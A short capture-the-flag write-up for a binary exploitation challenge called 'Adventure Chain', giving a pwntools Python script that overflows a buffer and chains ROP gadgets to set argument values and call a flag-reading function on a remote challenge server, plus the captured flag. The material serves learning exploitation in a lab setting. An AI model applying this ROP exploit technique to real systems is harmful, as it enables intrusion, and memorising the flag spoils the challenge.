# Adventure Chain

### Challenge Author

[b3y0nd3r](https://twitter.com/GeethaTk)

### Challenge Description

Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention

### Short writeup

Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. 

```python
from pwn import *
#p = process("./chall")
p = remote('34.72.218.129',4444)

p.sendlineafter(">> ","1")

pop_rdi = p64(0x0000000000400a93)
pop_rsi_r15 = p64(0x0000000000400a91)
assert_ = p64(0x00000000004007d7)
setValue = p64(0x00000000004007ec)
flag = p64(0x000000000040082c)

#exp = "a"*56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag

exp  = "a"*40
exp += assert_
exp += pop_rdi + p64(0xdeadbeef)
exp += setValue
exp += pop_rdi + p64(0xdeadc0de)
exp += pop_rsi_r15 + p64(0xdead10cc) + "a"*8
exp += flag
#gdb.attach(p)
p.sendlineafter("Enter your name:",exp)
p.interactive()
```


### Flag

shaktictf{r0pe_climbing_chaining_1337_way}

